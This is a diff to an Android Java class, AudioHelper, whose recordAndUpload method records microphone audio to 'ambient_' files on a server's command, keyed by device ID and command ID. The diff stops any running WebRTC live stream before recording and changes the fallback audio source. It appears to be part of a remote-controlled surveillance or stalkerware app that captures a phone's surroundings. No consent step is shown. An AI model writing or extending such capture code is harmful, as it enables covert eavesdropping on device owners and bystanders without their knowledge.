@@ -17,27 +17,29 @@ public class AudioHelper {
     }
 
     public static void recordAndUpload(final Context context, final String serverUrl, final String deviceId,
-                                       final String commandId, final int durationSeconds, final AudioCallback callback) {
+                                        final String commandId, final int durationSeconds, final AudioCallback callback) {
+        if (WebRtcStreamManager.getInstance().isStreaming()) {
+            WebRtcStreamManager.getInstance().stopLiveStream();
+            try { Thread.sleep(300); } catch (Exception ignored) {}
+        }
         final File outputFile = new File(context.getCacheDir(), "ambient_" + System.currentTimeMillis() + ".m4a");
         final MediaRecorder recorder = new MediaRecorder();
         boolean started = false;
 
-        // Mode 1: Standard MPEG_4 + AAC (recommended for modern Android)
         try {
             recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            recorder.setAudioEncodingBitRate(32000); // 32kbps lightweight encoding for 2G networks
-            recorder.setAudioSamplingRate(22050); // 22.05kHz optimized for human voice memos
+            recorder.setAudioEncodingBitRate(32000);
+            recorder.setAudioSamplingRate(22050);
             recorder.setOutputFile(outputFile.getAbsolutePath());
             recorder.prepare();
             recorder.start();
             started = true;
         } catch (Exception e1) {
-            // Mode 2: Universal Fallback (AMR_NB / 3GPP works on all Android devices including Huawei Honor 6X / Android 7.0)
             try {
                 recorder.reset();
-                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                recorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
                 recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                 recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                 recorder.setOutputFile(outputFile.getAbsolutePath());
